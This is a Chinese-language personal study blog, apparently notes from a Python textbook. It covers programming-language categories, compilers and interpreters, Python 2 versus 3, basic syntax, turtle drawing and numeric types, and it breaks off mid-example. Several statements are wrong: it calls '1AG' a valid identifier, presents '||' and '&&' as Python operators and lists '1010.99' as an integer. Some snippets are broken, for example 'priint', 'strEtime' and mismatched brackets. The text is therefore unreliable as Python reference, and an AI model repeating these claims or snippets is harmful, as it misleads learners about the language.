功能性指对数据的操作，表现为数据计算、输出输入处理和结果存储等。 可编程性指它可以根据一系列指令自动地、可预测地、准确地完成操作者的意图。\n程序设计语言 程序设计语言概述 程序设计语言是计算机能够理解和识别用户操作意图的一种交互体系，它按照特定规则组织计算机指令，使计算机能够自动进行各种运算处理。 简单地说就是我用机器的语言去告诉这个计算机我想干的，要这个计算机去完成，”交互“其实就类似交流互动的意思。\n程序设计语言包括3个大类：机器语言、汇编语言和高级语言。 机器语言是一种二进制语言，它直接使用二进制代码表达指令，是计算机硬件可以直接识别和执行的程序设计语言。例如，执行数字2和3的加法，16位计算机上的机器指令为：11010010 00111011，不同计算机结构的机器指令不同。\n直接使用机器语言编写程序十分繁冗，同时，二进制代码编写的程序难以阅读和修改，因此，汇编语言诞生了，它使用助记符与机器语言中的指令进行一一对应，在计算机发展早期能帮助程序员提高编程效率。例如，执行数字2和3的加法，汇编语言指令为：add 2, 3, result，运算结果写入 result。与机器语言类似，不同计算机结构的汇编指令不同。由于机器语言和汇编语言都直接操作计算机硬件并基于此设计，所以它们统称为 低级语言 。\n高级语言与低级语言的区别在于，高级语言 是接近自然语言的一种计算机程序设计语言，例如python和C语言、Java、html之类，这些可以更容易地描述协算问题并利用计算机解决计算问题。例如，执行数字2和3加法，高级语言代码为：result=2+3，这个代码只与编程语言有关，与计算机结构无关，同一种编程语言在不同计算机上的表达方式是一致的。\n编程语言分为两类：通用编程语言、专用编程语言 一般来说，通用编程语言比专用于某些领域的编程语言生命力更强。如HTML语言则是一个专用编程语言，应用在网络前端。它利用超链接将文本、图像、音/视频等资源组织起来形成 Web页面。像python就是通用型的了，能应用在多领域。\n如果能像科幻电影中的情节一样，用人类语言驱动计算机将是最完美的事情。\n遗憾的是，尽管许多一流科学家为此做过很多努力，仍然无法在可预见的未来设计出能完全理解人类语言的计算机。\n编译与解释 高级语言按照计算机执行方式的不同可分成两类：静态语言和脚本语言。这里所说的执行方式是指计算机执行一个程序的过程，静态语言采用编译执行，脚本语言采用解释执行。无论哪种执行方式，用户的使用方法可以是一致的，如通过鼠标双击执行一个程序。\n编译是将源代码转换成目标代码的过程，通常，源代码是高级语言代码，目标代码是机器语言代码，执行编译的计算机程序称为编译器（Compiler)。如图1.1展示了程序的编译过程，其中，虚线表示目标代码被计算机运行。编译器将源代码转换成目标代码，计算机可以立即或稍后运行这个目标代码。\n解释是将源代码逐条转换成目标代码同时逐条运行目标代码的过程。执行解释的计算机程序称为解释器（Interpreter)。如图1.2展示了程序的解释过程。其中，高级语言源代码与数据一同输入给解释器，然后输出运行结果。\n解释和编译的区别在于编译是一次性地翻译，一旦程序被编译，不再需要编译程序或者源代码。解释则在每次程序运行时都需要解释器和源代码。这两者的区别类似于外语资料的翻译和实时的同声传译。\n编译过程只进行一次，所以，编译过程的速度并不是关键，目标代码的运行速度是关键。因此，编译器一般都集成尽可能多的优化技术，使生成的目标代码具备更好的执行效率。然而，解释器却不能集成太多优化技术，因为代码优化技术会消耗运行事件，使整个程序的执行速度收到影响。\n采用编译方式有如下好处：\n（1）对于相同源代码，编译所产生的目标代码执行速度更快。\n（2）目标代码不需要编译器就可以运行，在同类型操作系统上使用灵活。\n采用解释方式有如下好处：\n（1）解释执行需要保留源代码，程序纠错和维护十分方便。在\n（2）只要存在解释器，源代码可以在任何操作系统上运行，可移植性好。\nPython语言概述 Python语言的发展 Python语言诞生于 1990年，由Guido van Rossum 设计并领导开发。1989年12月，Guido考虑启动一个开发项目以打发圣诞节前后的时间，所以决定为当时正在构思的一个新的脚本语言写一个解释器，因此在次年诞生了Python 语言。该语言以“Python”命名源于Guido对当时一部英剧“Monty Python\u0026rsquo;s Flying Circus”的极大兴趣。也许 Python 语言的诞生是个偶然事件，但20多年持续不断的发展将这个偶然事件变成了计算机技术发爆过程中的一件大事。\nPython语言是开源项目的优秀代表，其解释器的全部代码都是开源的，可以在Python语言的主网站(https://www.python.org/)自由下载。\n\u0026ldquo;Python 2.x 已经是遗产，Python 3.x 是这个语言的现在和未来\u0026rdquo;\n编写Hello程序 结构简单很多，比C简单：\n1 print(\u0026#34;Hello World\u0026#34;) Python语言的Hello程序似乎与人类语言类似，即通过一行语句就完成了输出一段文本的任务。其它编程语言的Hello程序并不这样简洁，如下是C语言的Hello程序，对比。\n1 2 3 4 5 6 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;Hello World\\n\u0026#34;); return 0; } C语言程序除了向屏幕输出“Hello World”的printf语句外，还包含了include、int、main、printf、return等其他辅助元素，这里就不具体介绍了。这个最小的例子只是一个缩影，Python 的简洁性在编程语言领域是公认的。同样功能的程序，Python语言实现的代码行数仅相当于C语言的1/10～1/5(其简洁程度取决于程序的复杂度和规模)。更少的代码行数、更简洁的表达方式将带来更少的程序错误、更快的程序开发速度和更好的可读性。这也是为什么很多CTF及其他行业的自动化脚本都是用Python来编写的重要原因之一。\nPython语言的特点 这里不按照书上那样的繁琐，我简洁说明：\n（1）语法简洁\n（2）与平台无关：作为脚本语言，Python 程序可以在任何安装解释器的计算机环境中执行，因此，用该语言编写的程序可以不经修改地实现跨平台运行。\n（3）粘性扩展：Python 语言具有优异的扩展性，体现在它可以集成C、C++、Java 等语言编写的代码，通过接口和函数库等方式将它们“粘起来”（整合在一起)。此外，Python 语言本身提供了良好的语法和执行扩展接口，能够整合各类程序代码。\n（4）开源理念\n（5）通用灵活\nPython语言开发环境配置 安装Python解释器 略，这里我不写的原因是Pycharm、vscode等的编程软件更新迭代较快，时间有限，来不及更改，而且这类安装教程这一块可以去BiliBili、CSDN去找教程，都很详细的。\n运行程序 运行Python 程序有两种方式：交互式和文件式。交互式指 Python 解释器即时响应用户输入的每条代码，给出输出结果。文件式，也称为批量式，指用户将Python程序写在一个或多个文件中，然后启动Python解释器批量执行文件中的代码。\n交互式一般用于调试少量代码，文件式则是最常用的编程方式。 其他编程语言通常只有文件式执行方式。\n下面以 Windows操作系统中运行 Hello程序为例具体说明两种方式的启动和执行方法。 1，交互式启动和运行方法\n交互式有两种启动和运行方法。 第一种方法，启动Windows操作系统命令行工具（\u0026lt;Windows系统安装目录\u0026gt;\\system32\\cmd.exe)，在控制台中输入“Python\u0026quot;，在命令提示符\u0026raquo;\u0026gt;后输入如下程序代码：\n1 print(\u0026#34;Hello World\u0026#34;) 1、交互式：多行代码难以运行 2、文件式：多代码运行\n运行Python程序 这里开始逐渐上强度了，我是先敲一敲Python代码，去运行一下，熟悉下它的逻辑原理，\n1、圆面积的计算：\n1 2 radius = 25 #圆的半径是25 area = 3.1415 * radius * radius #输入计算圆面积的公式print(area) 1963.4375000000002\n1 print(\u0026#34;{:.2f}\u0026#34;.format(area)) #只输出两位小数 1963.44\n2、简单人名对话：\n1 name = input(\u0026#34;输入姓名：\u0026#34;） 输入姓名：MISC\n1 print(\u0026#34;{}大佬，学好CTF，前途无量！\u0026#34;.format(name）） MISC大佬，学好CTF，前途无量！\n1 print(\u0026#34;{}大侠，学好CTF，大展拳脚！\u0026#34;.format(name[0])） MISC大侠，学好CTF，大展拳脚！\n1 print(\u0026#34;{}哥哥，学好Python，人见人爱！\u0026#34;.format(name[1:])） MISC哥哥，学好CTF，人见人爱！\n3、斐波那契数列的计算：根据斐波那契数列的定义，输出不大于1000的序列元素。交互式执行过程。\n1 2 3 4 a, b = 0, 1 while a \u0026lt; 1000: # 输出不大于1000的序列 print(a, end= \u0026#39;,\u0026#39;) a, b = b, a + b 4、同切圆的绘制\n1 2 3 4 5 6 import turtle #引用turtle库 turtle.pensize(2) #设置画笔宽度为2像素 turtle.circle(10) #绘制半径为10像素的画 turtle.circle(40) turtle.circle(80) turtle.circle(160) 如下： ”Python的魅力远不只如此“\n5、日期和时间的输出。 输出当前计算机的系统日期和时间。\n1 2 3 4 5 from datetime import datetime # 引用 datetime库 now = datetime.now() #获得当前日期和时间信息 print (now) now.strEtime(\u0026#34;%x\u0026#34;) #输出其中的日期部分 now.strftime(\u0026#34;%X\u0026#34;) #输出其中的时间部分 程序基本编写 IPO（Input, Process, Output)\n输入（Input）是一个程序的开始。程序要处理的数据有多种来源，因此形成了多种输入方式，包括文件输入、网络输入、控制台输入、交互界面输入、随机数据输入、内部参数输入等。\n（1）文件输入：将文件作为程序输入来源。在获得文件控制权后，需要根据文件格式解析内部具体数据。例如，统计Excel文件数据的数量，需要首先获得Excel文件的控制权，打开文件后根据 Excel 中数据存储方式获得所需处理的数据，进而开展计算。7.1 节将具体介绍文件的使用。\n（2）网络输入：将互联网上的数据作为输入来源。使用网络数据需要明确网络协议和特定的网络接口。例如，捕获并处理互联网上的数据，需要使用协议 HTTP并解析 HTML 格式。第10章将介绍网络爬虫的原理和方法。\n（3）控制台输入：将程序使用者输入的信息作为输入来源。当程序与用户间存在交互时，程序需要有明确的用户提示，辅助用户正确输入数据。从程序语法来说，这种提示不是必需的，但良好的提示设计有助于提高用户体验。（比较常用）\n（4）交互界面输入：通过提供一个图形交互界面从用户处获得输入来源。此时，鼠标移动或单|双击操作、文本框内的键盘操作等都为程序提供输入的方式。\n（5）随机数据输入：将随机数作为程序输入，这需要使用特定的随机数生成器程序或调用相关函数。4.5 节将详细介绍产生随机数的方法。\n（6）内部参数输入：以程序内部定义的初始化变量为输入，尽管程序看似没有从外部获得输入，但程序执行之前的初始化过程为程序赋予了执行所需的数据。\n输出(Output)是程序展示运算成果的方式。程序的输出方式包括控制台输出、图形输出、文件输出、网络输出、操作系统内部变量输出等。 （（1）（2）（3）比较常用）\n（1）控制台输出：以计算机屏幕为输出目标，通过程序运行环境中的命令行打印输出结果。这里“控制台”可以理解为启动程序的环境，例如，Windows中的命令行工具、IDLE工具等。\n（2）图形输出：在计算机中启动独立的图形输出窗口，根据指令绘制运算结果。\n（3）文件输出：以生成新的文件或修改已有文件方式输出运行结果，这是程序常用的输出方式。\n（4）网络输出：以访问网络接口方式输出数据。第10章将介绍自动向搜索引擎提交关键词查询的实例。\n（5）操作系统内部变量输出：指程序将运行结果输出到系统内部变量中，这类变量包括管道、线程、信号量等。\n处理（Process）是程序对输入数据进行计算产生输出结果的过程。计算问题的处理方法统称为“算法”，它是程序最重要的组成部分。可以说，算法是一个程序的灵魂。算法处理比较重要，在章节后续单独讲解。\nPython语言的迭代 版本区别 为什么Python 2”过时“了还要有人去学？在我网安学习期间，用到Kali Linux系统虚拟机，配置一些命令行工具时，有些经典脚本都是基于python2开发的 ，所以只能再给kali配置个python2和3的虚拟环境，才能用，在如今有些企业的系统产品有些也是基于python2开发的，在打补丁和维护升级时也需要用到python2，所以得对python2.x 基本了解，熟悉python3.x 。\n\u0026ldquo;Python 2.x已经是遗产，Python 3.x是这个语言的现在和未来。\u0026rdquo;\n2010年，Python 2.x系列发布了最后一个版本，其主版本号为2.7，同时，Python维护者们声称不在2.x系列中继续进行主版本号升级。Python 2.x系列已经完成了它的使命，逐步退出历史舞台。\n2008年，Python 3.x第一个主版本发布，其主版本号为3.0，并作为Python语言持续维护的主要系列。该系列在2012年推出3.3 版本,2014年推出3.4版本，2015年推出3.5 版本，2016年推出3.6 版本。目前，主要的Python 标准库更新只针对 3.x系列。\nPython 3.x 是 Python 语言的一次重大升级，它不完全向下兼容2.x系列程序。在语法层面，3.x系列继承了2.x系列绝大多数的语法表达，只是移除了部分混淆的表达方式。对于程序设计初学者来说，两者的差距很小，学会3.x系列也能看懂2.x。\n（1）修改编码：3.x系列默认采用UTF-8编码，因此处理中文与英文一样方便。 而且，在表达UTF-8编码字符串时，不需要在前面增加u或者U。 （2）修改print 语句：用print)函数替换了 print 语句，两者功能一样，格式不同：\n1 2 3 4 2.x: \u0026gt;\u0026gt;\u0026gt;print \u0026#34;The answer is\u0026#34;, 2 * 2 3.x: \u0026gt;\u0026gt;\u0026gt;print(\u0026#34;The answer is\u0026#34;, 2 * 2） 2.x: \u0026gt;\u0026gt;\u0026gt;print x， 3.x: \u0026gt;\u0026gt;\u0026gt;print(x, end=\u0026#34;,\u0026#34;） （3）修改exec语句:用exec()函数替换了 exec 语句，两者功能一样，格式不同。\n（4）去掉一符号：用!=表示“不等于”。\n（5）修改比较行为：用\u0026lt;、\u0026lt;=、\u0026gt;=、\u0026gt;符号比较两个元素时，如果元素之间不存在有意义的顺序关系，将抛出TypeError错误，不再返回 False。\n第二章：Python程序实例解析 Python语法规则 Python格式框架 Python语言采用严格的“缩进”来表明程序的格式框架，在符号“ ： ”下一行就需要缩进了，缩进用处是决定代码块的从属关系，说人话就是，比如if语句下一行开始，缩进相同的代码都是属于if旗下的，这好处是更加简洁。当然过C语言也知道。\n注释用语 注释用词是#、‘’‘、“”“ ”“”。\n1 2 3 4 5 6 7 8 9 10 11 12 13 print(\u0026#39;信不信？只能输出我这行字？\u0026#39;) #单行注释 #print(\u0026#39;666\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 我是 多 行 注释 print(\u0026#39;nihao\u0026#39;) \u0026#39;\u0026#39;\u0026#39; \u0026#34;\u0026#34;\u0026#34; 也是一样的效果，三对双单引号都可，只要是英文键就好 \u0026#34;\u0026#34;\u0026#34; 命名与保留字 与数学概念类似，Python 程序采用“变量”来保存和表示具体的数据值。为了更好地使用变量等其他程序元素，需要给它们关联一个标识符（名字)，关联标识符的过程称为命名。命名用于保证程序元素的唯一性。例如，实例代码 1.1中，TempStr是一个接收输入字符串的变量名字。 Python 语言允许采用大写字母、小写字母、数字、下画线 和汉字等字符及其组合给变量命名，但名字的首字符不能是数字，中间不能出现空格，长度没有限制。以下是合法命名的标识符：\npython_is_good、python_is_not_good、is_it_a_question、1AG\n除此之外，命名还不能和Python自带的专用词重名：\n字符串 字符串是字符的序列，可以按照单个字符或字符片段进行索引。字符串包括两号体系：正向递增序号和反向递减序号，如图所示。如果字符串长度为L，递增以最左侧字符序号为0,向右依次递增，最右侧字符序号为L-1；反向递减以最右侧字符序号为-1，向左依次递减，最左侧字符序号为-L。这两种索引字方法可以同时使用。实例代码1.1 中第3行 TempStr[-1]表示字符串TempStr变最后一个字符。\na[0:3]就表示从第0个到第3个的前一个也就是0、1、2，所以没有”h“。\n赋值语句 学过C语言就直接秒过懂了。\n单一赋值：\n1 2 3 4 5 t = x x = y y = t 同步赋值、一一对应：\n1 x, y = y, x input() 函数 也是很简单，类似C语言的scanf语句之类的，不同于C语言，这个input函数还有类似C的printf语句和scanf的作用，输出的同时还有输入作用。类比起来如下：\n1 input (\u0026#34;请输入\u0026#34;) 1 2 3 4 5 6 7 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;请输入\u0026#34;); scanf(\u0026#34;D\u0026#34;,\u0026amp;d); return 0; } 说人话就是一个python的input能同时等效C语言的printf和scanf。\n分支语句 if、elif、else这个字面意思翻译就好：\nif \u0026lt;条件1\u0026gt;\n​ \u0026lt;语句1\u0026gt;\nelif \u0026lt;条件2\u0026gt;\n​ \u0026lt;语句2\u0026gt;\n\u0026hellip;\u0026hellip;..N\u0026hellip;\u0026hellip;\nelse:\n​ \u0026lt;语句块N\u0026gt;\n理解来说，先从条件一开始判断，如果不满足第一个条件if，就跳到下一个条件elif上，不满足再接着下一个，直到最后一个条件else为止。当然编代码时，只有两个条件时只保留if和else。\nprint() 函数 print很像我们当今的用词“Say”，说话，输入你要说的，计算机就帮你说出来，print(\u0026lt;字符串\u0026gt;)在里面就是要说的，可以是字符串、数字等去输出变量。当输出变量值时，需要采用格式化输出方式，这需通过format()方法将待输出变量整理成期望输出的格式，（.format(F) 表示用变量 F 的值来替换前面的占位符）如：\n1 2 3 4 5 6 C1, C2 = 10, 10.24024 print (\u0026#34;转换后的温度是{:.2f}C\u0026#34;.format(C1)) #f 表示要格式化的数据是浮点数（小数）； .3 表示保留 3 位小数 print (\u0026#34;转换后的温度是{:.3f}C\u0026#34;.format(C2)) print (\u0026#34;输出格式错误\u0026#34;) 转换之后的温度是10.00C 转换之后的温度是10.240C\neval() 函数 eval函数很类似print，但不单纯是print的输出作用，，它能够以Python表达式的方式解析并执行字符串，并将返回结果，再由print去输出最终结果。例如：\n1 2 3 4 5 6 x = 1 print(eval(\u0026#34;x+1\u0026#34;)) #或者 x = 1 value = eval(\u0026#34;x+1\u0026#34;) print(value) 2\n1 2 x = 1 eval(\u0026#34;x + 1\u0026#34;) 无输出结果\n当然，eval还能这样用：\n1 2 value = eval(input(\u0026#34;请输入要计算的数值：\u0026#34;)) print(value*2) 。。。。。。\n循环语句 顾名思义就是在满足条件下去循环运行：\nwhile (\u0026lt;条件\u0026gt;): \u0026lt;语句块1\u0026gt; \u0026lt;语句2\u0026gt;\n当条件为真（true）时，执行语句块1语句，这些语句通过缩进表达与while语句的所属关系。当条件为假（false），退出循环，执行循环后语句块2语句，以此类推。\n以下实例使用了条件循环，该循环条件用于判断用户输入的最后一个字符（TempStr[-1]）是否为’N‘或’n‘。\n1 while TempStr[-1] not in [\u0026#39;N\u0026#39;,\u0026#39;n\u0026#39;]: 如果该字符是\u0026rsquo;N\u0026rsquo;或者\u0026rsquo;n\u0026rsquo;，则条件语句结果为false，退出循环，进而结束程序；否则条件语句结果为true，继续执行循环内部语句。这行语句中的not是保留字，表示对判断结果取反。后续章节对循环语句详细讨论。\nfor i in range(\u0026lt;循环次数\u0026gt;):\n​ \u0026lt;语句块1\u0026gt;\nPython模块-库的引用 先放预告片。。。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #e2.1DrawPython.py import turtle turtle.setup(650, 350, 200, 200) turtle.penup() turtle.fd(-250) turtle.pendown() turtle.pensize(25) turtle.pencolor(\u0026#34;purple\u0026#34;) turtle.seth(-40) for i in range(4): turtle.circle(40, 80) turtle.circle(-40, 80) turtle.circle(40, 80/2) turtle.fd(40) turtle.circle(16, 180) turtle.fd(40 * 2/3) 可以先运行下这代码。接下来都将围绕这段代码的各个函数进行拆解分析。\n库的引用 何为“库”？就是仓库的意思，没想到吧？Python语言还有仓库？就是解决更多问题的工具库，比如说math库、turtle库等，看字面意思就知道，math肯定和数学有关的，事实上确实如此。如果你在编Python语言时，想绘制sin函数的平面坐标图，直接写sin就发现Python它压根不认识这东西，这时你就需要引用math库去找里面你要的“工具”，表示出sin函数的编码，然后再引用turtle库去画图，两者一结合，熟悉的sin波浪线图就出来啦！！\n我们可以用import来引用库，如\n1 2 3 import math #导入 a = math.sin(3) #调用math库中的sin函数 priint(a) 当然也可以用from \u0026lt;库名\u0026gt; import \u0026lt;函数名，函数名，\u0026hellip;\u0026hellip;..，函数名\u0026gt; 以及from \u0026lt;库名\u0026gt; import *（*表示通配符，把库所有函数都调用），如果全部调用的话，那就直接写对应函数就好，不用写math.xxx，而是直接写xxx函数\n有关库的章节讨论放在后续。\nturtle库语法的引用 turtle（海龟）是一个直观有趣的的图形绘制函数库，所以说turtle比较重要，单独细讲。在这里我仅举几例：\n绘图坐标体系 turtle库绘制有一个基本的结构框架：一个小乌龟在坐标系中爬行，其爬行轨迹形状形成了绘制图形。对于小海龟来说，有”前进“、”后退“、”旋转“等爬行行为，跟游戏一样有一个前、后、左、右方向键，刚开始时小海龟在原点（0，0），行进方向为水平右方。 width：窗口宽度，如果值是整数，表示像素值：如果值是小数，表示窗口宽度与屏幕的比例。\nheight：窗口高度，如果值是整数，表示像素值；如果值是小数，表示窗口高度与屏幕的比例。\nstartx：窗口左侧与屏幕左侧的像素距离，如果值是 None，窗口位于屏幕水平中央。\nstarty：窗口顶部与屏幕顶部的像素距离，如果值是 None，窗口位于屏幕垂直中央。\n上图的预告片代码中就有这个setup函数，可以看到已经设定好窗口大小参数的。\n画笔控制函数 turtle.penup ()和 turtle.pendown ()函数，顾名思义，这俩家伙就是“笔”，上图的预告片的代码就有这俩函数。（这俩函数还有简称，分别是turtle.up和turtle.down或者turtle.pu和turtle.pd，在此了解下就好，还是全名可读性强些）\npenup函数和pendown函数按照字面意思易知，它们分别表示抬起画笔和落下画笔:\npenup函数会抬起画笔后，这时程序再让画笔移动是绘制不出形状的，需要pendown落下画笔才可绘制，毕竟penup相当于在空中抬笔这时候画画又能画出啥呢？\nturtle.pensize() 函数，别名：turtle.width()，就是控制画笔的粗度，例如pensize(25)表示25宽度的笔。\npensize函数的变量（）为无/none的话，则函数返回当前画笔的宽度。\nturtle.pencolor() 函数给画笔设置颜色，可以看看预告片的编码画出一条紫色小蛇，括号里可以是表示颜色的字符串，例如，”purple、blue“等；也可以是颜色对应的RGB数值，例如，（51, 204, 140）。\n英文名称 RGB 十六进制 中文名称 white 255 255 255 #FFFFFF 白色 black 0 0 0 #000000 黑色 grey 190 190 190 #BEBEBE 灰色 darkgreen 0 100 0 #006400 深绿色 gold 255 215 0 #FFD700 金色 violet 238 130 238 #EE82EE 紫罗兰色 purple 160 32 240 #A020F0 紫色 RGB颜色是计算机系统最常用的颜色体系之一，它采用R(红色）、G(绿色）、B（蓝色）3种基本颜色及它们的叠加组成各式各样的颜色，构成颜色体系。RGB颜色诞生于19 世纪中期、计算机产生之前，理论表明，RGB颜色能够形成人眼感知的所有颜色。 具体来说，RGB颜色采用（r,g,b）表示，其中，每个颜色采用8bit表示，取值范围是[0, 255]。因此，RGB颜色一共可以表示256（16 M，约1678万）。\n形状绘制函数 turtle.fd() 函数，全名turtle.forward() 函数，通过一组函数控制画笔的行进动作，进而绘制出形状。turtle.fd(distance) 表示向小海龟当前行进方向前进distance单位距离，值为负数就反方向走。\nturtle.seth() 函数，别名turtle.setheading (to_angle)，设置小海龟当前的行进方向，该角度为绝对方向的角度值。\nto_angle：角度的整数值。\nfor循环语句和turtle.circle() 函数\n1 2 3 4 5 for i in range (4): turtle.circle(40, 80) turtle.circle(-40, 80) turtle.circle(40, 80/2) turtle.circle(16, 180) turtle.circle(radius, extent=None)\n作用：根据半径radius绘制extent角度的弧形。\nradius：弧形半径，当值为正数时，半径在小海龟左侧，当值为负数，半径在小海龟右侧。\nextent：绘制弧形的弧度，当不设置弧度时默认”None“。\n以上就是个别例子，还有很多turtle 库函数的详细用法最好都了解下，因为比较基础，养成引用库的好习惯。\n第三章：Python语言的常规应用 数字类型 表示数字或数值的数据类型称为数字类型，Python语言提供3种数字类型：整数、浮点数和复数，分别对应数学中的整数、实数和复数。\n注意：1010表示一个整数，‘’1010”表示一个字符串。\n数字类型的正确运用能提高数字运算效率，同时具备较少的存储空间代价。整数和带有小数的数字分别由计算机中央处理器中不同的硬件逻辑操作，对于相同类型操作，如整数加法和小数加法，前者比后者的速度一般快5~20倍。\n整数类型 整数类型与数学中整数的概念一致，下面是整数类型的例子： 1010.99，-217，0x9a，-0×898\n整数类型共有4种进制表示：十进制、二进制、八进制和十六进制。默认情况，整数采用十进制，其他进制需要增加引导符号，如表3.1所示。二进制数以0b 引导，八进制数以0o引导，十六进制数以0x引导，大小写字母均可使用。\n进制种类 引导符号 描述 十进制 无 默认情况,例如,1010.-425 二进制 0b或0B 由字符0和1组成，例如，0b101,0B101 八进制 0o或0O 由字符0到7组成，例如00711,00711 十六进制 ox或0X 由字符0到9、a到f、A到F组成，例如，OxABC 整数类型理论上取值正负无穷，但现实是受运行Python程序的计算机内存大小。\n浮点数类型 浮点数类型与数学中实数的概念一致，表示带有小数的数值。Python语言要求所有浮点数必须带有小数部分，小数部分可以是 0，这种设计可以区分浮点数和整数类型。浮点数有两种表示方法：十进制表示和科学计数法表示。下面是浮点数类型的例子：0.0、-77. 、-2.17、3.1416、96e4、4.3e-3、9.6E5。当然，4.3e-3值为0.004.3、9.6E5也可以表示为9.6E+5。\n科学计数法使用字母e或E作为幂的符号，以10为基数，含义如下： $$ aeb = a*10^b $$ Python 浮点数的数值范围和小数精度受不同计算机系统的限制，sys.float_info详细列出了Python 解释器所运行系统的浮点数各项参数，例如：\n1 2 3 4 import sys sys.float_info sys.float_info.max sys.float_info (max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min _exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)\n1.7976931348623157e+308\n关于浮点数的精度问题 浮点数在超过15位数字计算中产生的误差与计算机内部采用二进制运算有关，使用浮点数无法进行极高精度的数学运算。\n由于Python语言能够支持无限制且准确的整数计算，因此，如果希望获得精度更高的计算结果，往往采用整数而不直接采用浮点数。例如，计算如下两个数的乘法值，它们的长度只有10个数字，其中：\na=3.141592653， b=1.2345678\n1 2 3.141592653*1.2345678 3141592653*12345678 #去掉小数点 3.8785094379864535\n3878509437986453394\n到此为止，你可以很清楚看到确实有误差，一切归根到底是计算机内部底层基础的差异造成的，毕竟计算到15位小数相同，这个误差已经很小了，这个精度在现实生活中已能够应对绝大多数的计算研究了。\n复数类型 复数类型表示数学中的复数。这个大家应该都很熟悉： $$ x^2=-1 $$ 复数可以看作是二元有序实数对(a,b)，表示为a+i，其中，a是实数部分，简称实部，b是虚数部分，简称虚部。根据图3.1，复数是实数在二维平面空间旋转的一和麦示。\nPython语言中，复数的虚数部分通过后缀“i”或“j”来表示，例如：12.3+4j、-5.6+7j、1.23e-4+5.67e+89j\n复数类型中实数部分和虚数部分的数值都是浮点类型。对于复数z,可以用z.real和z.imag 分别获得它的实数部分和虚数部分，例如：\n1 2 1.23e-4+5.67e+89j.real #实部 1.23e-4+5.67e+89j.imag #虚部 0.000123\n5.67e+89\n复数类型在科学计算中十分常见，基于复数的运算属于数学的复变函数分支，该分支有效支撑了众多科学和工程问题的数学表示和求解。Python 直接支持复数类型，为这类运算求解提供了便利。\nBool类型（补充） Bool数类型只有True、False这两种，在Python中Bool比较特殊，在这里需要着重了解下特性就好，在Python或者C中，True或者False很大程度上用来作判断条件语句的一部分的，学过C语言的都知道：true和false分别可用1、0表示，也可以说是等价关系。那类比到Python中则是一样的，但特性在于：\n1 2 a = True + 10 #a = 1 + 10 print(a) 11\n对于False也是一样，这里不详细讲解，只要知道有这个特性就好，毕竟Bool类型是归类到整数类型之下的。\n数字类型的操作 内置的数值运算操作符 Python提供了9个基本的数值运算操作符，如下所示。这些操作符由Python解释器直接提供，不需要引用标准或第三方函数库，也叫做内置操作符。\n操作符 描述 || “或”的意思，比如a = 3 x + y x与y之和 x - y x与y之差 x * y x与y之积 x / y x与y之商 x // y x与y之整数商，即不大于×与y之商的最大整数 x % y x与y之商的余数。也称为模运算 -x x的负值即x*(-1） \u0026amp;\u0026amp; ”和“的意思，比如a = 3\u0026amp;\u0026amp;b = 2，意思是a=3的同时b还要为2 x**y x的y次幂，即x的y次方 这些操作符几乎与数学习惯一致，运算结果也符合数学意义。操作符运算的结果可能改变数字类型，3种数字类型之间存在一种逐渐扩展的关系，具体如下：\n整数-\u0026gt;浮点数\u0026gt;复数\n这是因为整数可以看成是浮点数没有小数的情况，浮点数可以看成是复数虚部为0的情况。基于上述扩展关系，数字类型之间相互运算所生成的结果是“更宽”的类型，基本规则如下。\n（1）整数之间运算，如果数学意义上的结果是小数，结果是浮点数。\n（2）整数之间运算，如果数学意义上的结果是整数，结果是整数。\n（3）整数和浮点数混合运算，输出结果是浮点数。\n（4）整数或浮点数与复数运算，输出结果是复数。\n如下例子所示：\n1 2 3 4 100/3 100//3 123 + 4.0 10.0 - 1 + 2j #等价于(10.0 - 1)+2j 33.333333333333336\n33\n127.0\n(9+2j)\nBool运算符（补充） Bool运算符：\u0026amp;（按位与运算）\nBool的运算符\u0026amp;和上面所讲的\u0026amp;\u0026amp;有区别，但在实际编程中很容出错，需要多加小心\n1 2 a = 4 \u0026amp; 5 print(a) 4\n这么计算的？很奇怪，让我来给你解释： 它们进行的是”按位与’运算。按位与运算的规则是：对两个数字的二进制每一位分别进行运算，只有当对应位都为 1 时，结果位才为 1，否则为 0。\n1 2 3 4 4--\u0026gt;100 #4的二进制是100 5--\u0026gt;101 #5的二进制是101 _______ 100 得出最终结果等于100，再进行十进制转换得出为4。\nBool运算符：|（按位或运算）\n这个就比较霸道了e///\n4\u0026ndash;\u0026gt;100 #4的二进制是100 5\u0026ndash;\u0026gt;101 #5的二进制是101\n4\u0026ndash;\u0026gt;100 #4的二进制是100 5\u0026ndash;\u0026gt;101 #5的二进制是101\n1 2 a = 6 | 5 print(a) 7\n它们进行的是”按位或’运算。按位或运算的规则是：对两个数字的二进制每一位分别进行运算，当对应位出现 1 时，结果位必为 1，否则为 0。\n1 2 3 4 6--\u0026gt;110 #6的二进制是110 5--\u0026gt;101 #5的二进制是101 _______ 111 得出最终结果等于111，再进行十进制转换得出为7。\n内置的数值运算函数 函数 描述 abs(x) x的绝对值 divmod(x,y) (x//y,x%y)，输出为二元组形式（也称为元组类型） pow(x,y[,z]) (x**y)%z,[.]表示该参数可以省略。即pow(x,y)，它与相同 round(x[,ndigits]) 对x四舍五入，保留ndigits位小数。round(x)返回四舍五入的整数值 max(X1,X2,\u0026hellip;\u0026hellip;,Xn) X1,X2,\u0026hellip;.,Xn的最大值，n没有限定 min(X1,X2\u0026hellip;\u0026hellip;,Xn) X1,X2,\u0026hellip;.,Xn的最小值，n没有限定 内置的数字类型转换函数 数值运算操作符可以隐式地转换输出结果的数字类型，例如，两个整数采用运算符”的除法将可能输出浮点数结果。此外，通过内置的数字类型转换函数可以显式地在数字类型之间进行转换，如表3.4所示。 浮点数类型转换为整数类型时，小数部分会被舍弃（不使用四舍五入)，复数不能直接转换为其他数字类型，可以通过.real和.imag将复数的实部或虚部分别转换，例如：\n函数 描述 int(x) 将x转换为整数，x可以是浮点数或字符串 float(x) 将x转换为浮点数，x可以是整数或字符串 complex(re[,im]) 生成一个复数，实部为re，虚部为im，re 可以是整数、浮点数或字符串，im可以是整数或浮点数但不能为字符串 1 2 3 4 int (10.99) complex(10.99) #复数包含实数和虚数，用complex是表示复数形式 float(10 + 99j) #解释器必报错，复数不是浮点数类型float float((10 + 99j).imag) 输出结果分别是：\n10\n(10.99 + 